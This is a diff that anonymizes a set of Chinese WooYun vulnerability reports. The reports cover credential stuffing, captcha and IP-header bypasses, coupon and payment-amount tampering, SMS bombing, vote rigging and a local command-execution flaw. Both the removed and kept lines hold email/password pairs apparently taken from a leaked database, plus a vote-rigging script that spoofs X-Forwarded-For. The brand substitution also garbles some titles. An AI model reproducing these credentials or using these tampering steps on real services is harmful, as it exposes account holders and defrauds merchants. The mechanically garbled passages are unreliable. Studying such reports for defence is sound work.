+**详情**: 主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号主站登陆验证码绕过。验证码只在之前的一步有验证，最后登录的时候没有验证。。这逻辑写的。。。登录数据包如下：POST /doLogin HTTP/1.1Host: my.gfan.comProxy-Connection: keep-aliveContent-Length: 108Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit
 
-**POC**: 经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。lyyarq@yeah.net	429131222wtzjw1112@163.com	wtzjw885281112zqdzly@tom.com	12345678ls1277@qq.com	19880818360412641@QQ.COM	90281972375971709@qq.com	83030545gwxarc@hotmail.com	072324aaynliliang@gmail.com	liliangSlp2433@qq.com	369258174zhaox
+**POC**: 经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。lyyarq@yeah.net	429131222wtzjw1112@163.com	wtzjw885281112zqdzly@tom.com	12345678ls1277@某互联网公司.com	19880818360412641@某互联网公司.COM	90281972375971709@某互联网公司.com	83030545gwxarc@hotmail.com	072324aaynliliang@gmail.com	liliangSlp2433@某互联网公司.com	369258174zhaox
 
 **绕过**: 过滤绕过
 
-**修复**: 撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/
+**修复**: 撞库防御参考资料:https://example.com/[已脱敏]
 ---
 
 ---
@@ -26933,8 +26933,8 @@
 ---
 
 ---
-### [wooyun-2015-0125060] 饿了么逻辑漏洞之免费吃喝不是梦
-**厂商**: 饿了么 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0125060] 某外卖平台逻辑漏洞之免费吃喝不是梦
+**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -26945,9 +26945,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 自认为思路还是屌屌的，没见过类似的漏洞啊，能打雷么~问题是在饿了么早餐的地方，饿了么早餐真心方便啊早餐最近出了个活动，可以领10元抵用券输入信息后，领取成功这一步其实是收集信息，后面的一个请求才是真的申领红包抵用券的请求测试发现，一个手机号只能领2个红包于是就开始fuzz1）正常情况，只能2次，无法多次获取红包{"flag":2,"phoneNo":"18xxxxxxx33"}{"status":"ERROR","data":null,"message":"该用户最多只能领取2次"}2）测试是否仅对phoneNo做校验，在手机号后面加字母测试{"flag":2,"phoneNo":"18xxxxxxx33ff"}{"status":"SUCCESS","data":"获取成功","message":null}是可以发送成功的，只是因为手机号错误的原因，我们收不到短信3）那么思路就来了，只要
+**详情**: 自认为思路还是屌屌的，没见过类似的漏洞啊，能打雷么~问题是在某外卖平台早餐的地方，某外卖平台早餐真心方便啊早餐最近出了个活动，可以领10元抵用券输入信息后，领取成功这一步其实是收集信息，后面的一个请求才是真的申领红包抵用券的请求测试发现，一个手机号只能领2个红包于是就开始fuzz1）正常情况，只能2次，无法多次获取红包{"flag":2,"phoneNo":"18xxxxxxx33"}{"status":"ERROR","data":null,"message":"该用户最多只能领取2次"}2）测试是否仅对phoneNo做校验，在手机号后面加字母测试{"flag":2,"phoneNo":"18xxxxxxx33ff"}{"status":"SUCCESS","data":"获取成功","message":null}是可以发送成功的，只是因为手机号错误的原因，我们收不到短信3）那么思路就来了，只要
 
-**POC**: 总结一下正常情况可以成功{"flag":2,"phoneNo":"18xxxxxxx33"}手机号前面加86可以成功{"flag":2,"phoneNo":"8618xxxxxxx33"}短号，小号，可以转发短信的。例如阿里小号，亲情小号等{"flag":2,"phoneNo":"13216994045！"}分号分隔可以成功，可无限获取红包{"flag":2,"phoneNo":"18xxxxxxx33,138xxxxxxx"}3天的早餐只要5毛钱，给饿了么点个赞啊
+**POC**: 总结一下正常情况可以成功{"flag":2,"phoneNo":"18xxxxxxx33"}手机号前面加86可以成功{"flag":2,"phoneNo":"8618xxxxxxx33"}短号，小号，可以转发短信的。例如阿里小号，亲情小号等{"flag":2,"phoneNo":"13216994045！"}分号分隔可以成功，可无限获取红包{"flag":2,"phoneNo":"18xxxxxxx33,138xxxxxxx"}3天的早餐只要5毛钱，给某外卖平台点个赞啊
 
 **绕过**: 过滤绕过
 
@@ -26956,7 +26956,7 @@
 
 ---
 ### [wooyun-2012-05285] 2012洛阳首届胸模大赛投票系统刷票漏洞
-**厂商**: 洛阳网 http://www2.lyd.com.cn:8080/ | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 洛阳网 https://example.com/[已脱敏] | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -26967,13 +26967,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #!/bin/bash# author @十三乙# vote for http://weibo.com/1680241201/y9ZarqaHo# http://www2.lyd.com.cn:8080/ph.aspREFERER="http://www2.lyd.com.cn:8080/ph.asp";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11";while true;doFAKEIP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"curl -X POST -H "X-Forwarded-For:$FAKEI
+**详情**: #!/bin/bash# author @十三乙# vote for https://example.com/[已脱敏] https://example.com/[已脱敏]"https://example.com/[已脱敏]";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/535.11";while true;doFAKEIP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"curl -X POST -H "X-Forwarded-For:$FAKEI
 
-**POC**: @李铁根 ： 越是身处喧嚣迷乱的尘世，越要坚持真实的自己。在这个去伪存真的日子，伸出你有爱的双手，帮忙在洛阳首届胸模大赛中投康艳艳一票吧。http://t.cn/zOMyhTb#!/bin/bash# author @十三乙# vote for http://weibo.com/1680241201/y9ZarqaHo# http://www2.lyd.com.cn:8080/ph.aspREFERER="http://www2.lyd.com.cn:8080/ph.asp";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1
+**POC**: @李铁根 ： 越是身处喧嚣迷乱的尘世，越要坚持真实的自己。在这个去伪存真的日子，伸出你有爱的双手，帮忙在洛阳首届胸模大赛中投康艳艳一票吧。https://example.com/[已脱敏] author @十三乙# vote for https://example.com/[已脱敏] https://example.com/[已脱敏]"https://example.com/[已脱敏]";USER_AGENT="Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1
 
 **绕过**: 直接利用
 
-**修复**: 验证码绕过：初始化session中的验证码、处理post请求时判断验证码是否为空。IP绕过：综合RemoteAddress和XFF判断是否重复投票。可参考： 浅谈新形势下在线Web投票系统的攻防(1)/(2)× http://blog.mckelv.in/articles/1114.html
+**修复**: 验证码绕过：初始化session中的验证码、处理post请求时判断验证码是否为空。IP绕过：综合RemoteAddress和XFF判断是否重复投票。可参考： 浅谈新形势下在线Web投票系统的攻防(1)/(2)× https://example.com/[已脱敏]
 ---
 
 ---
@@ -27011,9 +27011,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、电子版报告下载链接存在设计缺陷，在已登录的情况下，可以绕过订单支付直接下载任意报告。2、报告信息展示页面的contentId参数http://www.pishu.com.cn/skwx_ps/initDatabaseDetail?siteId=14&contentId=1816755&contentType=literature3、报告下载链接中的参数可预测，ID即为下载的文件内容标识，且与报告信息展示页面的contentId参数一致。由于此处报告下载未与订单支付业务进行关联，可以绕过订单支付的业务逻辑直接下载本站全部文档。（未进行实际操作）http://www.pishu.com.cn/skwx_ps/multimedia/download?ID=2217777&siteid=14&Type=literature
+**详情**: 1、电子版报告下载链接存在设计缺陷，在已登录的情况下，可以绕过订单支付直接下载任意报告。2、报告信息展示页面的contentId参数https://example.com/[已脱敏]
 
-**POC**: 1、报告信息展示页面http://www.pishu.com.cn/skwx_ps/initDatabaseDetail?siteId=14&contentId=1816755&contentType=literature2、未支付订单：3、下载电子文档
+**POC**: 1、报告信息展示页面https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -27043,8 +27043,8 @@
 ---
 
 ---
-### [wooyun-2015-0150443] 百度贴吧安卓版升级漏洞
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0150443] 某搜索引擎贴吧安卓版升级漏洞
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -27099,7 +27099,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://buy.hiapk.com/  商城地址 随便找个商品我们截获数据包 发现是post 那么你会看到我圈住的那个地方是商品数量他没有限制负数,我们试试看成功了、、、那么再找一个比他高一点价格好了。。。点击结算我勒个去没有 - -这个商品是找不到送货方式的我们同样方法重新来一遍就提交好了、
+**详情**: https://example.com/[已脱敏]  商城地址 随便找个商品我们截获数据包 发现是post 那么你会看到我圈住的那个地方是商品数量他没有限制负数,我们试试看成功了、、、那么再找一个比他高一点价格好了。。。点击结算我勒个去没有 - -这个商品是找不到送货方式的我们同样方法重新来一遍就提交好了、
 
 **POC**: 里面的东西好贵。。。
 
@@ -27127,7 +27127,7 @@
 
 **绕过**: 过滤绕过
 
-**修复**: 撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/
+**修复**: 撞库防御参考资料:https://example.com/[已脱敏]
 ---
 
 ---
@@ -27165,7 +27165,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付漏洞这里我只到支付宝没有去实际付钱。正常情况:不正常：撞裤：撞密码撞用户名，就不上图了。自己改吧。
+**详情**: 支付漏洞这里我只到某电商平台没有去实际付钱。正常情况:不正常：撞裤：撞密码撞用户名，就不上图了。自己改吧。
 
 **POC**: 正常情况:不正常：撞裤：撞密码
 
@@ -27219,8 +27219,8 @@
 ---
 
 ---
-### [wooyun-2015-0104193] QQ空间音乐播放器组件可导致任意执行本地命令
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0104193] 某互联网公司空间音乐播放器组件可导致任意执行本地命令
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -27231,7 +27231,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ空间的播放器插件功能由本地的COM对象提供。而漏洞正是因为组件注册时，通过修改注册表的方式注册了一个进程外COM组件且没有考虑路径问题而引发。导致系统在进行COM分析加载索引EXE路径时,触发了CreateProcess执行漏洞。【影响范围】XP、Win7 X64 | X86【触发场景】1.  浏览器访问存在音乐播放器的QQ空间页面时，精心放置的Program.exe工具会被加载。（已测试：IE、360安全浏览器、搜狗高速浏览器、Chrome浏览器）2. 直接利用OLEViewer找到音乐播放器接口，调用CoCreateInstance接口即可触发，可以参见代码。
+**详情**: 某互联网公司空间的播放器插件功能由本地的COM对象提供。而漏洞正是因为组件注册时，通过修改注册表的方式注册了一个进程外COM组件且没有考虑路径问题而引发。导致系统在进行COM分析加载索引EXE路径时,触发了CreateProcess执行漏洞。【影响范围】XP、Win7 X64 | X86【触发场景】1.  浏览器访问存在音乐播放器的某互联网公司空间页面时，精心放置的Program.exe工具会被加载。（已测试：IE、360安全浏览器、搜狗高速浏览器、Chrome浏览器）2. 直接利用OLEViewer找到音乐播放器接口，调用CoCreateInstance接口即可触发，可以参见代码。
 
 **POC**: 1. 播放器一览2. 浏览器触发IE360浏览器搜狗高速浏览器3. 利用COM直接调用
 
@@ -27307,8 +27307,8 @@
 ---
 
 ---
-### [wooyun-2015-0105001] 腾讯QQ/微信手机客户端（ios、安卓）URL欺骗漏洞
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0105001] 某互联网公司某互联网公司/某互联网公司手机客户端（ios、安卓）URL欺骗漏洞
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -27319,7 +27319,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯qq、微信在分享第三方连接的时候会显示<title>里面的内容.而这个title里面的内容我们是可以任意控制，如果把这个title换成mail.qq.com？或者taobao.com呢？相信很多人都会认为这是qq邮箱的url或者taobao网的连接。如果被不法分子用做钓鱼....T_T
+**详情**: 某互联网公司某互联网公司、某互联网公司在分享第三方连接的时候会显示<title>里面的内容.而这个title里面的内容我们是可以任意控制，如果把这个title换成mail.某互联网公司.com？或者taobao.com呢？相信很多人都会认为这是某互联网公司邮箱的url或者taobao网的连接。如果被不法分子用做钓鱼....T_T
 
 **POC**: (见原文)
 
@@ -27341,7 +27341,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 手机登陆 http://m.meitun.com/login.html登陆次数过多要求输入验证码 通过修改X-Forwarded-For 可以实现绕过POST /mobile/user/signin.htm HTTP/1.1X-Forwarded-For: 27.1.14.87Accept: */*X-Requested-With: XMLHttpRequestContent-Type: application/jsonReferer: http://m.meitun.com/login.htmlAccept-Language: zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoProxy-Connection:
+**详情**: 手机登陆 https://example.com/[已脱敏] 通过修改X-Forwarded-For 可以实现绕过POST /mobile/user/signin.htm HTTP/1.1X-Forwarded-For: [IP已脱敏]Accept: */*X-Requested-With: XMLHttpRequestContent-Type: application/jsonReferer: https://example.com/[已脱敏] zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoProxy-Connection:
 
 **POC**: (见原文)
 
@@ -27363,7 +27363,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点http://www.e-soochowlife.com来换个大电源17500积分呢抓包改不客气，成功来看订单状态，代发货来看看怎么成就中东土豪当然是买京东卡咯 自动发货
+**详情**: 站点https://example.com/[已脱敏] 自动发货
 
 **POC**: (见原文)
 
@@ -27451,9 +27451,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 购买页面直接向支付宝POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生!
+**详情**: 购买页面直接向某电商平台POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生!
 
-**POC**: 选定购买100元（5人次职业胜任力测评）后，点击下一步，使用Fiddler拦截发送的数据把其中的100改为0.01这时候到支付宝上显示的就是金额0.01支付成功!
+**POC**: 选定购买100元（5人次职业胜任力测评）后，点击下一步，使用Fiddler拦截发送的数据把其中的100改为0.01这时候到某电商平台上显示的就是金额0.01支付成功!
 
 **绕过**: 直接利用
 
@@ -27462,7 +27462,7 @@
 
 ---
 ### [wooyun-2015-0127391] 广东某市级移动接口再探短信轰炸
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -27473,7 +27473,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 就这样，我在乌云上搜索了 “短信轰炸”搜到了WooYun: 广东某市级移动接口未限制导致短信轰炸回复是：CNVD未直接复现，复现所述情况似乎需要本地号码，已经转由CNCERT直接转报给中国移动集团公司，由其后续协调分公司处置。看来是处理过的呀。我进去看了看，管理员也的确加了验证码那又怎么样！继续抓包！POST /smsGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: http://www.dghui.com/register.actionAccept: */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateUser-Agent: M
+**详情**: 就这样，我在乌云上搜索了 “短信轰炸”搜到了WooYun: 广东某市级移动接口未限制导致短信轰炸回复是：CNVD未直接复现，复现所述情况似乎需要本地号码，已经转由CNCERT直接转报给某运营商集团公司，由其后续协调分公司处置。看来是处理过的呀。我进去看了看，管理员也的确加了验证码那又怎么样！继续抓包！POST /smsGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateUser-Agent: M
 
 **POC**: HTTP/1.1 200 OKDate: Fri, 17 Jul 2015 08:50:42 GMTServer: ApacheContent-Language: zhContent-Type: text/html;charset=UTF-8Content-Length: 4true
 
@@ -27495,7 +27495,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 西南交通大学图书馆http://www.lib.swjtu.edu.cn/Default.aspx打开图书馆首页，看到登录界面，无验证码，通过测试也无ip等限制，所以暴力破解：得到一些帐号密码后就没有继续破解下去了：从得到的帐号里随机选取登录，测试成功：点击上图右上角的“我的书斋”，进入个人书斋界面：点击上图中部的“书斋设置”，点击“绑定手机”：输入手机号即可短信轰炸，经测试，联通无任何限制，移动电信情况不明：
+**详情**: 西南交通大学图书馆https://example.com/[已脱敏]
 
 **POC**: 证明如上～学生安全意识不强，登录帐号很好破解；加之绑定手机无限制，活生生的短信轰炸机！PS：贵校请别找我喝茶，友情测试，没发多少条。。。
 
@@ -27505,8 +27505,8 @@
 ---
 
 ---
-### [wooyun-2013-040193] 淘宝客户端校验不严谨缺陷
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-040193] 某电商平台客户端校验不严谨缺陷
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -27517,7 +27517,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝客户端并未对SD卡上的plugin下的插件进行校验，而是根据包名进行，比如把电影的zip包com.taobao.movie.android.zip修改为com.taobao.wireless.tbpcharge.zip，电影就变成充值的，更进一步的如果修改一个apk，符合淘宝客户端调用的一定情况后，将其包名修改为com.taobao.movie.android.zip，点击电影就能跳转过去了。那就能进行很多跟账户安全等等相关的操作了。如果自己的apk包中再包含一些支付宝的页面，可以窃取到支付宝的用户名密码信息。
+**详情**: 某电商平台客户端并未对SD卡上的plugin下的插件进行校验，而是根据包名进行，比如把电影的zip包com.taobao.movie.android.zip修改为com.taobao.wireless.tbpcharge.zip，电影就变成充值的，更进一步的如果修改一个apk，符合某电商平台客户端调用的一定情况后，将其包名修改为com.taobao.movie.android.zip，点击电影就能跳转过去了。那就能进行很多跟账户安全等等相关的操作了。如果自己的apk包中再包含一些某电商平台的页面，可以窃取到某电商平台的用户名密码信息。
 
 **POC**: (见原文)
 
@@ -27563,7 +27563,7 @@
 
 **详情**: 我用的就是小米2s，小米手机存在一个比较验证的缺陷，其他小米的手机型号不知道有没有这个漏洞，当文件管理器被上了隐私锁后，需要密码才可以进入文件管理，我发现完全可以用第三方软件来绕过验证，从而查看“任意”文件。
 
-**POC**: 假设哈，我是说假设，一台小米手机落到了他人的手里，你的手机里的文件管理里面有着挺重要的文件，但是你上了锁，你以为这样就不会被别人读取么？其实很简单，就拿第三方软件百度云或者腾讯微云的客户端说起吧- -.别人完全可以给你的手机安装一个百度云或者腾讯微云.腾讯微云绕过小米文件管理器锁方式：点击上传文件就直接进入手机的根目录- -.读取任意文件，然后上传到自己的腾讯微云网盘- -.百度云绕过小米文件管理器锁方式：点击上传，然后读取就可以读取本机的文件，前几个是可以根据分类读取，点击那个“全部”.就可以进入上了锁的文件管理器- -.从而将文件上传到自己的百度云网盘- -.
+**POC**: 假设哈，我是说假设，一台小米手机落到了他人的手里，你的手机里的文件管理里面有着挺重要的文件，但是你上了锁，你以为这样就不会被别人读取么？其实很简单，就拿第三方软件某搜索引擎云或者某互联网公司微云的客户端说起吧- -.别人完全可以给你的手机安装一个某搜索引擎云或者某互联网公司微云.某互联网公司微云绕过小米文件管理器锁方式：点击上传文件就直接进入手机的根目录- -.读取任意文件，然后上传到自己的某互联网公司微云网盘- -.某搜索引擎云绕过小米文件管理器锁方式：点击上传，然后读取就可以读取本机的文件，前几个是可以根据分类读取，点击那个“全部”.就可以进入上了锁的文件管理器- -.从而将文件上传到自己的某搜索引擎云网盘- -.
 
 **绕过**: 过滤绕过
 
@@ -27605,7 +27605,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://eyun.sh.189.cn/注册账号 有免费15G的空间然后http://eyun.sh.189.cn/user/disk-up-space.jsp  升级空间并选择70元1T然后提交如图接下来抓包修改980为0.01提交下来付款就ok了！！！
+**详情**: https://example.com/[已脱敏] 有免费15G的空间然后https://example.com/[已脱敏]  升级空间并选择70元1T然后提交如图接下来抓包修改980为0.01提交下来付款就ok了！！！
 
 **POC**: 账号密码是123456 你也可登陆去看看！！顺便再问下我上次发的两个漏洞怎么没有审核！！
 
@@ -27627,7 +27627,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发送验证码的接口地址：http://api.iron.meiliwu.com/customer/sendVerify?account=18518551855&c_d=2&c_p=ios&c_s=6135f04b&c_u=DB767BCF-9559-40D6-8C83-CC3ABCB342D1&c_v=1.0.0&code=edqc&env=prod这个接口直接返回了验证码，通过这个验证码就可以登录了
+**详情**: 发送验证码的接口地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -27659,8 +27659,8 @@
 ---
 
 ---
-### [wooyun-2015-0144176] 网易云音乐一个有意思的逻辑漏洞（权限判断设计不当）
-**厂商**: 网易 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0144176] 某互联网公司云音乐一个有意思的逻辑漏洞（权限判断设计不当）
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -27703,8 +27703,8 @@
 ---
 
 ---
-### [wooyun-2013-038341] 在百度贴吧无权限发语音的贴吧发语音!
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-038341] 在某搜索引擎贴吧无权限发语音的贴吧发语音!
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -27717,7 +27717,7 @@
 
 **详情**: 多的不说,自己看吧!这样就可以发送语音了!
 
-**POC**: http://tieba.baidu.com/p/2616946550自己看吧,我也不想说什么了.
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
